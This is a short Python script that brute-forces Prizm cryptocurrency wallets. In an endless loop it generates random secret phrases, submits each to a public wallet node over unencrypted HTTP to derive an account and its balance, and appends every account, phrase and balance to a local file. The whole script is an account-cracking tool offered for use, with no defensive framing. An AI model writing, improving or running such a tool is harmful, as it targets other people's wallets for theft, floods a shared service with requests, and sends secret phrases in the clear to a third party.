data = {'a': 1, 'b': 2}
import requests
import json
import random
def passwdrandom():
 length = 50
 passwd = list('1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ')
 random.shuffle(passwd)
 q = ''.join([random.choice(passwd) for x in range(length)])
 return q

def akk():
 try:
  password = passwdrandom()
  req = 'http://wallet.prizm.space/prizm?requestType=getAccountId&secretPhrase='
  acc = 'http://wallet.prizm.space/prizm?requestType=getBalance&account='
  rs = requests.post(req+password, data=data)
  jsonData = rs.json()
  account = jsonData["account"]
  qa = requests.post(acc+account, data=data)
  accony = qa.json()
  print(jsonData["accountRS"], ":", password, accony["balanceNQT"] + " PZM")
  f = open('wallet.txt', 'a')
  f.write(jsonData["accountRS"] + ":" + password + " " + accony["balanceNQT"] + " PZM"'\n')
  f.close()
 except:
  print("ERROR")

while True:
 akk()
